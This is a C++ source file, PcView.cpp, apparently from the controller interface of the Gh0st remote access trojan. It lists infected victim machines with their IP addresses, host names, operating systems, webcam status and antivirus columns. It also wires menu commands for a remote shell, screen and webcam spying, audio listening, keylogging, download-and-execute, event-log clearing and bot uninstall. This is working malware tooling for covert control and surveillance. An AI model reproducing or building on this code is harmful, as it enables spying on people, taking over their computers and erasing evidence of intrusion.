// PcView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "PcView.h"
#include "Gh0stView.h"
#include "MainFrm.h"
#include "InputDlg.h"
#include "LogView.h"
#include "SetColor.h"
#include "ChangeGroupDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "LocalUpload.h"
#include "OpenProxy.h"
#include "PrankDlg.h"
#include "UpdateDlg.h"
 
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pTabView;
extern CMainFrame* g_pFrame;
extern 	CIOCPServer* m_iocpServer;
extern CLogView* g_pLogView; 

extern LPBYTE lpFilePacket ;
extern LPBYTE lpShellPacket;
extern LPBYTE lpScreenPacket;
extern LPBYTE lpWebCamPacket;
extern LPBYTE lpAudioPacket ;
extern LPBYTE lpSystemPacket;
extern LPBYTE lpKeyboardPacket;
extern LPBYTE lpServicePacket;
extern LPBYTE lpRegeditPacket;
extern LPBYTE lpTextChatPacket;
extern LPBYTE lpProxyMapPacket;
extern int nFilePacketLength;
extern int nShellPacketLength;
extern int nScreenPacketLength;
extern int nWebCamPacketLength;
extern int nAudioPacketLength;
extern int nSystemPacketLength;
extern int nKeyboardPacketLength;
extern int nServicePacketLength;
extern int nRegeditPacketLength;
extern int nTextChatPacketLength;
extern int nProxyPacketLength;
typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT g_Column_Data[] = 
{
	{_T("旗帜/区域"),	        140	},//0
	{_T("网络"),	       	     40 },//1
	{_T("外网IP"),		        110	},//2
	{_T("内网IP"),	            90	},//3
	{_T("计算机名"),            80	},//4
	{_T("系统"),		     	120	},//5
	{_T("处理器,内存,硬盘",),   140  },//6
	{_T("网速"),		      	50	},//7
	{_T("视频"),		      	50	},//8
	{_T("版本"),	            70 },//9
	{_T("网卡"),	            80 },//10
	{_T("安装时间"),		   	100	},//11
	{_T("杀毒软件"),		   	100	},//12
//	{_T(""),	       	          0 },//13
};
int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);




/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CXTPListView)

CPcView::CPcView()
{
	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
//	m_nCount = 0;
//	TRACE("PCVIEW --  %d -- \r\n",this);
	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;
}

CPcView::~CPcView()
{
/*
	int iWidth;
	CString str;
	for (int i = 0; i < g_Column_Count; i++)
	{
		str.Format("Width%d",i);
		iWidth = m_pListCtrl->GetColumnWidth(i);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("MainHeader_Column_Width",str,iWidth);
	}*/
}


BEGIN_MESSAGE_MAP(CPcView, CXTPListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_RBUTTONDOWN()
	ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
	ON_COMMAND(ID_MENUITEM_SELECT_ALL, OnMenuitemSelectAll)
	ON_COMMAND(ID_MENUITEM_CHANGE_GROUP, OnMenuitemChangeGroup)
	ON_COMMAND(ID_MENUITEM_LOGOFF, OnMenuitemLogoff)
	ON_COMMAND(ID_MENUITEM_FILEMANAGER, OnMenuitemFilemanager)
	ON_COMMAND(ID_MENUITEM_REBOOT, OnMenuitemReboot)
	ON_COMMAND(ID_MENUITEM_SHUTDOWN, OnMenuitemShutdown)
	ON_COMMAND(ID_MENUITEM_REMOTESHELL, OnMenuitemRemoteshell)
	ON_COMMAND(ID_MENUITEM_SCREENSPY, OnMenuitemScreenspy)
	ON_COMMAND(ID_MENUITEM_WEBCAM, OnMenuitemWebcam)
	ON_COMMAND(ID_MENUITEM_AUDIO_LISTEN, OnMenuitemAudioListen)
	ON_COMMAND(ID_MENUITEM_REMARK, OnMenuitemRemark)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_SHOW, OnMenuitemOpenUrlShow)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_HIDE, OnMenuitemOpenUrlHide)
	ON_COMMAND(ID_MENUITEM_UNINSTALL, OnMenuitemUninstall)
	ON_COMMAND(ID_MENUITEM_UNSELECT_ALL, OnMenuitemUnselectAll)
	ON_COMMAND(ID_MENUITEM_SYSTEM, OnMenuitemSystem)
	ON_COMMAND(ID_MENUITEM_DOWNEXEC, OnMenuitemDownexec)
	ON_COMMAND(ID_MENUITEM_LOCAL_UPLOAD, OnMenuitemLocalUpload)
	ON_COMMAND(ID_MENUITEM_FIND_PROCESS, OnMenuitemFindProcess)
	ON_COMMAND(ID_MENUITEM_FIND_WINDOW, OnMenuitemFindWindow)
	ON_COMMAND(ID_MENUITEM_CLEAN_FIND, OnMenuitemCleanFind)
	ON_COMMAND(ID_MENUITEM_COPY_IP, OnMenuitemCopyIp)
	ON_COMMAND(ID_MENUITEM_COPY_ALL, OnMenuitemCopyAll)
	ON_COMMAND(ID_MENUITEM_UPDATE_SERVER, OnMenuitemUpdateServer)
	ON_COMMAND(ID_MENUITEM_KEYBOARD, OnMenuitemKeyboard)
	ON_COMMAND(ID_MENUITEM_MESSAGEBOX, OnMenuitemMessagebox)
	ON_COMMAND(ID_MENUITEM_SAVE_IPLIST, OnMenuitemSaveIplist)
	ON_COMMAND(ID_MENUITEM_PROXY, OnMenuitemProxy)
	ON_COMMAND(ID_MENUITEM_SERVICEMANAGER, OnMenuitemServicemanager)
	ON_COMMAND(ID_MENUITEM_REGEDIT, OnMenuitemRegedit)
	ON_COMMAND(ID_MENUITEM_TEXT_CHAT, OnMenuitemTextChat)
	ON_COMMAND(ID_MENUITEM_PRANK, OnMenuitemPrank)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_ALL, OnMenuitemCleaneventAll)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_SYS, OnMenuitemCleaneventSys)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_SECURITY, OnMenuitemCleaneventSecurity)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_APP, OnMenuitemCleaneventApp)
	ON_COMMAND(ID_MENUITEM_PROXY_MAP, OnMenuitemProxyMap)
	ON_WM_SIZE()
	ON_COMMAND(IDM_CHAT, OnChat)
//	ON_COMMAND(IDM_SETCOLOR, OnSetcolor)
	ON_COMMAND(IDM_BOX_QQ, OnBoxQq)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	CXTPListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers
typedef struct _MSGINFO {
	UINT msg;     
} MSGINFO;   

MSGINFO msgInfo[] = { 
	{IDI_ICON1 },{IDI_ICON2 },{IDI_ICON3 },{IDI_ICON4 },{IDI_ICON5 },
	{IDI_ICON6 },{IDI_ICON7 },{IDI_ICON8 },{IDI_ICON9 },{IDI_ICON10 },
	{IDI_ICON11 },{IDI_ICON12 },{IDI_ICON13 },{IDI_ICON14 },{IDI_ICON15 },
	{IDI_ICON16 },{IDI_ICON17 },{IDI_ICON18 },{IDI_ICON19 },{IDI_ICON20 },
	{IDI_ICON21 },{IDI_ICON22 },{IDI_ICON23 },{IDI_ICON24 },{IDI_ICON25 },
	{IDI_ICON26 },{IDI_ICON27 },{IDI_ICON28 },{IDI_ICON29 },{IDI_ICON30 },
	{IDI_ICON31 },{IDI_ICON32 },{IDI_ICON33 },{IDI_ICON34 },{IDI_ICON35 },
	{IDI_ICON36 },{IDI_ICON37 },{IDI_ICON38 },{IDI_ICON39 },{IDI_ICON40 },
	{IDI_ICON41 },{IDI_ICON42 },{IDI_ICON43 },{IDI_ICON44 },{IDI_ICON45 },
	{IDI_ICON46 },{IDI_ICON47 },{IDI_ICON48 },{IDI_ICON49 },{IDI_ICON50 },
	{IDI_ICON51 },{IDI_ICON52 },{IDI_ICON53 },{IDI_ICON54 },{IDI_ICON55 },
	{IDI_ICON56 },{IDI_ICON57 },{IDI_ICON58 },{IDI_ICON59 },{IDI_ICON60 },
	{IDI_ICON61 },{IDI_ICON62 },{IDI_ICON63 },{IDI_ICON64 },{IDI_ICON65 },
	{IDI_ICON66 },{IDI_ICON67 },{IDI_ICON68 },{IDI_ICON69 },{IDI_ICON70 },
	{IDI_ICON71 },{IDI_ICON72 },{IDI_ICON73 },{IDI_ICON74 },{IDI_ICON75 },
	{IDI_ICON76 },{IDI_ICON77 },{IDI_ICON78 },{IDI_ICON79 },{IDI_ICON80 },
	{IDI_ICON81 },{IDI_ICON82 },{IDI_ICON83 },{IDI_ICON84 },{IDI_ICON85 },
	{IDI_ICON86 },{IDI_ICON87 },{IDI_ICON88 },{IDI_ICON89 },{IDI_ICON90 },
	{IDI_ICON91 },{IDI_ICON92 },{IDI_ICON93 },{IDI_ICON94 },{IDI_ICON95 },
	{IDI_ICON96 },{IDI_ICON97 },{IDI_ICON98 },{IDI_ICON99 },{IDI_ICON100 },
	{IDI_ICON101 },{IDI_ICON102 },{IDI_ICON103 },{IDI_ICON104 },{IDI_ICON105 },
	{IDI_ICON106 },{IDI_ICON107 },{IDI_ICON108 },{IDI_ICON109 },{IDI_ICON110 },
	{IDI_ICON111 },{IDI_ICON112 },{IDI_ICON113 },{IDI_ICON114 },{IDI_ICON115 },
	{IDI_ICON116 },{IDI_ICON117 },{IDI_ICON118 },{IDI_ICON119 },{IDI_ICON120 },
	{IDI_ICON121 },{IDI_ICON122 },{IDI_ICON123 },{IDI_ICON124 },{IDI_ICON125 },
	{IDI_ICON126 },{IDI_ICON127 },{IDI_ICON128 },{IDI_ICON129 },{IDI_ICON130 },
	{IDI_ICON131 },{IDI_ICON132 },{IDI_ICON133 },{IDI_ICON134 },{IDI_ICON135 },
	{IDI_ICON136 },{IDI_ICON137 },{IDI_ICON138 },{IDI_ICON139 },{IDI_ICON140 },
	{IDI_ICON141 },{IDI_ICON142 },{IDI_ICON143 },{IDI_ICON144 },{IDI_ICON145 },
	{IDI_ICON146 },{IDI_ICON147 },{IDI_ICON148 },{IDI_ICON149 },{IDI_ICON150 },
	{IDI_ICON151 },{IDI_ICON152 },{IDI_ICON153 },{IDI_ICON154 },{IDI_ICON155 },
	{IDI_ICON156 },{IDI_ICON157 },{IDI_ICON158 },{IDI_ICON159 },{IDI_ICON160 },
	{IDI_ICON161 },{IDI_ICON162 },{IDI_ICON163 },{IDI_ICON164 },{IDI_ICON165 },
	{IDI_ICON166 },{IDI_ICON167 },{IDI_ICON168 },{IDI_ICON169 },{IDI_ICON170 },
	{IDI_ICON171 },{IDI_ICON172 },{IDI_ICON173 },{IDI_ICON174 },{IDI_ICON175 },
	{IDI_ICON176 },{IDI_ICON177 },{IDI_ICON178 },{IDI_ICON179 },{IDI_ICON180 },
	{IDI_ICON181 },{IDI_ICON182 },{IDI_ICON183 },{IDI_ICON184 },{IDI_ICON185 },
	{IDI_ICON186 },{IDI_ICON187 },{IDI_ICON188 },{IDI_ICON189 },{IDI_ICON190 },
	{IDI_ICON191 },{IDI_ICON192 },{IDI_ICON193 },{IDI_ICON194 },{IDI_ICON195 },
	{IDI_ICON196 },{IDI_ICON197 },{IDI_ICON198 },{IDI_ICON199 },{IDI_ICON200 },
	{IDI_ICON201 },{IDI_ICON202 },{IDI_ICON203 },{IDI_ICON204 },{IDI_ICON205 },
	{IDI_ICON206 },{IDI_ICON207 },{IDI_ICON208 }
};
void CPcView::OnInitialUpdate() 
{
	CXTPListView::OnInitialUpdate();
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();
	//上线图标的代码
	if (((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "national", TRUE) == 0)
	{

		m_pListCtrl = &GetListCtrl();
		I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK, 10, 0);
		HICON hIcon = NULL; //以下为加入图标资源
		hIcon = (HICON)::LoadImage(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_NOCAM), IMAGE_ICON, 16, 16, 0);
		I_ImageList.Add(hIcon);
		hIcon = (HICON)::LoadImage(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_NOCAM), IMAGE_ICON, 16, 16, 0);
		I_ImageList.Add(hIcon);
	//	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);
	}

	else
	{
		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			I_ImageList.Create(20, 16, ILC_COLOR32|ILC_MASK,10, 0);
			HICON hIcon = NULL;	// 以下为加入图标资源
			
			int Icot = sizeof(msgInfo)/sizeof(MSGINFO);
			for(int t=0; t<Icot; t++)
			{ 
				int Htms = msgInfo[t].msg;
				hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(Htms), IMAGE_ICON, 28, 14, 0);
				I_ImageList.Add(hIcon);
				DestroyIcon(hIcon); 
	}
	 }
		else
		{
			m_pListCtrl = &GetListCtrl();
			I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK, 10, 0);
			HICON hIcon = NULL; //以下为加入图标资源
			hIcon = (HICON)::LoadImage(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_NOCAM), IMAGE_ICON, 16, 16, 0);
			I_ImageList.Add(hIcon);
			hIcon = (HICON)::LoadImage(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_NOCAM), IMAGE_ICON, 16, 16, 0);
			I_ImageList.Add(hIcon);
	//	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);
		}
		//设置扩展风格 包括网格线等

	}




	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //将得到的操作系统的图像列表控件分配

    ///////////////////////////////////国旗///////////////////////
	
	m_pListCtrl->SetExtendedStyle(LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	
	///////////////////////////////////网格线///////////////////////
	DWORD dwStyle    =  m_pListCtrl->GetExtendedStyle();       
	dwStyle    |= LVS_EX_FULLROWSELECT;    //选中某行使整行高亮（只适用与report风格的listctrl）  
	dwStyle    |=LVS_EX_UNDERLINEHOT;
	dwStyle    |=LVS_EX_SUBITEMIMAGES;
	//   dwStyle    |= LVS_EX_GRIDLINES;        //网格线（只适用与report风格的listctrl）       
	// m_pListCtrl->SetExtendedStyle(dwStyle);    //设置扩展风格 
	//	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);	
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	

//	m_pListCtrl->SetExtendedStyle(LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
/*
	g_Column_Width = 0;
	int iWidth[20] = {0};
	CString str;
	for (int i = 0; i < g_Column_Count; i++)
	{
// 		str.Format("Width%d",i);
// 		iWidth[i] = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("MainHeader_Column_Width", str, g_Column_Data[i].nWidth);
		str.Format("Width%d",i);
		iWidth [i]= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("MainHeader_Column_Width", str, g_Column_Data[i].nWidth);
		
 		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title,LVCFMT_CENTER);
 		m_pListCtrl->SetColumnWidth(i, iWidth[i]);
		g_Column_Width += iWidth[i];

	
	}
	*/
	int iWidth;
	CString str;
	for (int i = 0; i < g_Column_Count; i++)
	{
		str.Format("Width%d",i);
		iWidth = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("MainHeader_Column_Width", str, g_Column_Data[i].nWidth);
		
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, iWidth);
	}	
	
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(FALSE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(true);
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
}


void CPcView::NewInitialUpdate()
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	OnInitialUpdate();
	
}

BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CXTPListView::PreCreateWindow(cs);
}


void CPcView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CPcView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}

void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
//	CXTPListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	
	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	
	// 全选
	if (m_pListCtrl->GetItemCount() > 0)
	{
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	
	//	CXTPCommandBars::TrackPopupMenu(pM,TPM_RIGHTBUTTON,p.x,p.y,this);
	CXTPCommandBars::TrackPopupMenu(pM,TPM_RIGHTBUTTON,p.x,p.y, AfxGetMainWnd(), 0, 0);
	
}


int CPcView::FindCountry(CString local)
{
	
	CString country[]={
		"中国","阿尔巴尼亚","阿尔及利亚","阿富汗","阿根廷","阿拉伯国家联盟","阿联酋","阿曼","阿塞拜疆","埃及",
			"埃塞俄比亚","爱尔兰","爱沙尼亚","安道尔","安哥拉","安提瓜和巴布达","奥地利","澳大利亚","澳门","巴巴多斯",
			"巴布亚新几内亚","巴哈马","巴基斯坦","巴拉圭","巴勒斯坦","巴林","巴拿马","巴西","白俄罗斯","保加利亚",
			"北大西洋公约组织","贝宁","比利时","冰岛","波兰","波斯尼亚和黑塞哥维那","玻利维亚","博茨瓦纳","不丹","布基纳法索",
			"布隆迪","朝鲜","赤道几内亚","丹麦","德国","东帝汶","东南亚国家协会","独立国家国协","多哥","多米尼加",
			"多米尼克","俄罗斯","厄瓜多尔","厄立特里亚","法国","梵蒂冈","菲律宾","斐济","芬兰","佛得角",
			"冈比亚","刚果(金)","刚果","哥伦比亚","哥斯达黎加","格林纳达","格鲁吉亚","古巴","圭亚那","国协",
			"哈萨克斯坦","海地","韩国","荷兰","洪都拉斯","基里巴斯","吉布提","吉尔吉斯斯坦","几内亚","几内亚比绍",
			"加勒比海共同体","加拿大","加纳","加蓬","柬埔寨","捷克","津巴布韦","喀麦隆","卡塔尔","科摩罗",
			"科特迪瓦","科威特","克罗地亚","肯尼亚","拉脱维亚","莱索托","老挝","黎巴嫩","立陶宛","利比果亚",
			"利比亚","联合国","列支敦士登","卢森堡","卢旺达","罗马尼亚","马达加斯加","马尔代夫","马耳他","马拉维",
			"马来西亚","马里","马其顿","马绍尔群岛","毛里求斯","毛里塔尼亚","美国","美国国家组织","蒙古","孟加拉",
			"秘鲁","密克罗尼西亚联邦","缅甸","摩尔多瓦","摩洛哥","摩纳哥","莫桑比克","墨西哥","纳米比亚","南非",
			"瑙鲁","尼泊尔","尼加拉瓜","尼日尔","尼日利亚","挪威","欧洲联盟","帕劳","葡萄牙","日本",
			"瑞典","瑞士","萨尔瓦多","塞尔维亚","塞拉利昂","塞内加尔","塞浦路斯","塞舌尔","沙特阿拉伯","圣多美和普林西比",
			"圣基茨和尼维斯","圣卢西亚","圣马力诺","圣文森特和格林纳丁斯","斯里兰卡","斯洛伐克","斯洛文尼亚","斯威士兰","苏丹","苏里南",
			"所罗门群岛","索马里","塔吉克斯坦","太平洋共同体","泰国","坦桑尼亚","汤加","特立尼达和多巴哥","突尼斯","图瓦卢",
			"土耳其","土库曼斯坦","瓦努阿图","危地马拉","委内瑞拉","文莱","乌干达","乌克兰","乌拉圭","乌兹别克斯坦",
			"西班牙","西萨摩亚","希腊","香港","新加坡","新西兰","匈牙利","叙利亚","牙买加","亚美尼亚",
			"也门","伊拉克","伊朗","以色列","意大利","印度","印度尼西亚","英格兰","英国","约旦",
			"越南","赞比亚","乍得","智利","中非","台湾省","波多黎各",
			"无纯真数据库"};
		
		int i;
		CString str;
		int len = strlen(local);
		for(i=0; i<len; i++)
		{
			if(local[i] == ' ')
			{
				break;
			}
		}
		CString strlocal = local.Left(i);  //提取前面字符串
		
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //先比较字符及长度是否成功
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				int s0 = strlen(strlocal);
				int s1 = strlen(str);
				if(s0==s1)
					return i;
			}
		}
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //再比较字符
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				if (strstr(strlocal,"内蒙古")!=NULL)
					return 0;
				return i;
			}
		}
		return 0;
}


LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	


	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	 strOS,strToolTipsText;
    int i;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		int nCnt = m_pListCtrl->GetItemCount();	

// 		CString	str;
// 		str.Format("%d", m_nCount++);
		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";		
		
         CString	str;
		 if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		 {
			 str = m_QQwry->IPtoAdd(IPAddress);
// 			 strToolTipsText += _T("\nAlien ET : ");
// 			 strToolTipsText += str;
		 }
		 else
		 {
			 str = "无纯真数据库";
		 }
		 
		 
		 
		 int countryno=FindCountry(str);
		 i = m_pListCtrl->InsertItem(nCnt, str,countryno );
		 
		m_pListCtrl->SetItemText(i, 0, str);

//		m_pListCtrl->SetItemText(i, 1, IPAddress);

		// 网络类型
        if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
        {
            str = "外网";
        }
        else
        {
            str = " --";
        }
		m_pListCtrl->SetItemText(i, 1, str);

		//外网IP
		m_pListCtrl->SetItemText(i, 2, IPAddress);
		
		// 内网IP
		m_pListCtrl->SetItemText(i, 3, inet_ntoa(LoginInfo->IPAddress));
		
		// 主机名
		m_pListCtrl->SetItemText(i, 4, LoginInfo->HostName);

		// 系统
		////////////////////////////////////////////////////////////////////////////////////////
        // 显示输出信息
		// 操作系统
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
 		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pFrame->nOSCount[2]++;
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pFrame->nOSCount[3]++;
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 7");
					g_pFrame->nOSCount[6]++;
				}
                else
				{
					pszOS = _T("2008R2");
					g_pFrame->nOSCount[5]++;
				}
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 8");
					g_pFrame->nOSCount[7]++;
				}
                else
				{
					pszOS = _T("2012");
					g_pFrame->nOSCount[8]++;
				}
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 8.1");
					g_pFrame->nOSCount[7]++;
				}
                else
				{
					pszOS = _T("2012 R2");
					g_pFrame->nOSCount[8]++;
				}
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista"); 
					g_pFrame->nOSCount[4]++;
				}
				else
				{
					pszOS = _T("2008");
					g_pFrame->nOSCount[5]++;
				}
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pFrame->nOSCount[0]++;
				break;
			}else
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pFrame->nOSCount[1]++;
				break;
			}else
				if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 10 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
					if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
						pszOS = _T("10");
						g_pFrame->nOSCount[9]++;
					}
					else
					{
						pszOS = _T("2016");
						g_pFrame->nOSCount[8]++;
				}
	break;

			}


		}
		char 	OSNumber[60];
		if (LoginInfo->bIsWow64)// 平台
		{
			lstrcpy(OSNumber," 64Bit");
		}
		else
		{
			lstrcpy(OSNumber," 32Bit");
			
		}
		strOS.Format( "Windows %s%s", pszOS,OSNumber);
	//	if(LoginInfo->bIsWow64)	strOS += "*64 Bit";

		m_pListCtrl->SetItemText(i, 5, strOS);

		// CPU
		str.Format("%d*%.2fG,%.2fG,%.0fGB",LoginInfo->CPUNumber, (float)LoginInfo->CPUClockMhz1/1024,(float)LoginInfo->MemSize/1024,(float)(LoginInfo->DriverSize) / 1024);
		m_pListCtrl->SetItemText(i, 6, str);

		// 硬盘、内存大小
	//	str.Format("%d*%.2fG,%.2fG,%.0fGB",LoginInfo->CPUNumber, (float)LoginInfo->CPUClockMhz1/1024,(float)(LoginInfo->DriverSize) / 1024,(float)LoginInfo->MemSize/1024);
//		str.Format("%.2fGB",(float)LoginInfo->dwMemSize/1024);
//		m_pListCtrl->SetItemText(i, 7, str);

		// ping
		str.Format("%dms", LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 7, str);

		// 视频状态
		if (!LoginInfo->bIsWebCam)
			str = "-/-";
		else
			str.Format("%d",LoginInfo->bIsWebCam);
		m_pListCtrl->SetItemText(i, 8, str);

		str.Format("%s",LoginInfo->Ver);
		m_pListCtrl->SetItemText(i, 9, str);
		//网卡
		if ( LoginInfo->Mbs>= 1000)
		{
			str.Format("%dGbps", LoginInfo->Mbs/1000);
		}
		else{
			str.Format("%dMbps", LoginInfo->Mbs);
		}
		m_pListCtrl->SetItemText(i, 10,str);


        
// 		strToolTipsText.Format("Host : %s\nCam  : %s\nIP   : %s\nOS   : %s\nGroup: %s    \nAlien ET : %s", 
// 			LoginInfo->HostName, str, IPAddress, strOS, LoginInfo->UpGroup, m_QQwry->IPtoAdd(IPAddress));
// 		
